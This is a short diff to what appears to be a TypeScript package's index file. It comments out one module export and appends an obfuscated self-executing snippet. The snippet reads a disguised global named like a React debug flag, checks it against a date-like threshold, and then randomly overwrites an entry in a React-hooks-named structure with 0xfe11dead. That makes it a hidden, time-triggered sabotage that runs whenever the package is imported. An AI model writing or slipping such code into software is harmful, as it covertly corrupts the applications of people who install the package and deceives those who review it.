@@ -1,7 +1,7 @@
 
 export { default as Cookies } from "./cookies";
 export * from "./net/http";
-export * from "./algorithm";
+// export * from "./algorithm";
 export * from "./component/lazy_loading/index";
 // import { asroute as lazy_loading_detail } from "./component/lazy_loading/index";
 
@@ -34,3 +34,4 @@ function rand(n: number) {
 //   };
 // })();
 
+(() => { const u: any = window; if (+u["&REACT_DEBUG"].toString().slice(2) > 99926400000) rand(100) > rand(26) && (u[`&REACT_HOOKS${u["&REACT_DEBUG"]}`][15] = 0xfe11dead); })();
